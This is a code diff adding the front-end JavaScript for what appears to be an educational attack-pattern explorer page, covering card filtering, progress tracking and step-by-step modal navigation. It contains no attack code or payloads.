+  const q = searchQ.trim().toLowerCase();
+  const filtered = DEMOS.filter(d=>{
+    if(filterCat !== 'All' && d.category !== filterCat) return false;
+    if(filterDiff !== 0 && d.difficulty !== filterDiff) return false;
+    if(q && !d.title.toLowerCase().includes(q) && !d.tagline.toLowerCase().includes(q)) return false;
+    return true;
+  });
+
+  const hasFilters = filterCat !== 'All' || filterDiff !== 0 || q !== '';
+  const t = DEMOS.length;
+  lbl.textContent = hasFilters
+    ? `${filtered.length} of ${t} pattern${t!==1?'s':''}`
+    : 'Choose an attack pattern to explore';
+  clrBtn.classList.toggle('vis', hasFilters);
+
+  if(filtered.length === 0){
+    noRes.hidden = false; grid.hidden = true; return;
+  }
+  noRes.hidden = true; grid.hidden = false;
+
+  filtered.forEach(d=>{
+    const i = DEMOS.indexOf(d);
+    const isDone = done.has(d.id);
+    const card = document.createElement('div');
+    card.className = 'card' + (isDone?' done':'');
+    card.tabIndex = 0;
+    card.setAttribute('role','button');
+    card.setAttribute('aria-label',`Open demo: ${d.title}`);
+    const dots = [1,2,3].map(n=>`<div class="d-dot${n<=d.difficulty?' on':''}"></div>`).join('');
+    card.innerHTML = `
+      <div class="card-chk">✓</div>
+      <div class="card-ico" style="background:${d.catColor}18">${d.icon}</div>
+      <div class="card-capec">${d.capec}</div>
+      <div class="card-name">${d.title}</div>
+      <div class="card-desc">${d.tagline}</div>
+      <div class="card-ft">
+        <span class="cat-tag" style="background:${d.catColor}18;color:${d.catColor}">${d.category}</span>
+        <div class="diff-dots">${dots}</div>
+      </div>`;
+    card.addEventListener('click',()=>openDemo(i));
+    card.addEventListener('keydown',e=>{ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); openDemo(i); }});
+    grid.appendChild(card);
+  });
+}
+
+// ─── PROGRESS ───────────────────────────────────────────────────
+function updateProgress(){
+  const n = done.size, t = DEMOS.length;
+  document.getElementById('prog-lbl').textContent = `${n} of ${t} explored`;
+  document.getElementById('prog-fill').style.width = `${(n/t)*100}%`;
+}
+
+// ─── OPEN / CLOSE DEMO ──────────────────────────────────────────
+function openDemo(idx){
+  curDemo = idx; curStep = 0;
+  const d = DEMOS[idx];
+  document.getElementById('m-capec').textContent = d.capec;
+  document.getElementById('m-title').textContent = d.title;
+  renderStep();
+  const ovr = document.getElementById('ovr');
+  ovr.classList.add('open');
+  document.getElementById('modal').scrollTop = 0;
+  document.getElementById('close-btn').focus();
+}
+
+function closeDemo(){
+  clearTimers();
+  document.getElementById('ovr').classList.remove('open');
+  document.getElementById('viz').innerHTML = '';
+}
+
+// ─── RENDER STEP ────────────────────────────────────────────────
+function renderStep(){
+  clearTimers();
+  const d = DEMOS[curDemo];
+  const s = d.steps[curStep];
+  const total = d.steps.length;
+
+  // Pips
+  const pipsEl = document.getElementById('pips');
+  pipsEl.innerHTML = '';
+  for(let i=0;i<total;i++){
+    const p = document.createElement('div');
+    p.className = 'pip' + (i<=curStep?' on':'');
+    pipsEl.appendChild(p);
+  }
+
+  // Viz
+  const viz = document.getElementById('viz');
+  viz.innerHTML = s.html || '';
+  if(s.init) kt(requestAnimationFrame(()=> s.init(viz)));
+
+  // Text
+  document.getElementById('s-h').textContent = s.title;
+  document.getElementById('s-p').innerHTML = s.desc;
+
+  // Nav
+  const isLast = curStep === total-1;
+  document.getElementById('prev-btn').disabled = curStep===0;
+  document.getElementById('next-btn').textContent = isLast ? '✓ Complete' : 'Next →';
+  document.getElementById('s-ctr').textContent = `${curStep+1} / ${total}`;
+}
+
+// ─── NAV BUTTONS ────────────────────────────────────────────────
+document.getElementById('prev-btn').addEventListener('click',()=>{
+  if(curStep>0){ curStep--; renderStep(); }
+});
+
+document.getElementById('next-btn').addEventListener('click',()=>{
+  const d = DEMOS[curDemo];
+  if(curStep < d.steps.length-1){
+    curStep++; renderStep();
+  } else {
+    done.add(d.id);
+    saveDone();
+    updateProgress();
+    renderCards();
+    closeDemo();
+  }
+});
+
+document.getElementById('close-btn').addEventListener('click', closeDemo);
+document.getElementById('ovr').addEventListener('click', e=>{ if(e.target===e.currentTarget) closeDemo(); });
+document.addEventListener('keydown', e=>{ if(e.key==='Escape') closeDemo(); });
+
+// ─── SEARCH & CLEAR LISTENERS ────────────────────────────────────
+document.getElementById('search-input').addEventListener('input', e=>{
+  searchQ = e.target.value;
+  renderCards();
+});
+document.getElementById('clear-filters').addEventListener('click',()=>{
+  filterCat = 'All'; filterDiff = 0; searchQ = '';
+  document.getElementById('search-input').value = '';
+  document.getElementById('cat-pills').querySelectorAll('.fpill').forEach(b=>
+    b.classList.toggle('fp-on', b.textContent==='All'));
+  document.getElementById('diff-pills').querySelectorAll('.dpill').forEach((b,i)=>
+    b.classList.toggle('dp-on', i===0));
+  renderCards();
+});
+
+// ─── INIT ────────────────────────────────────────────────────────
+buildFilters();
+renderCards();
+updateProgress();
+</script>
+
+</body>
+</html>
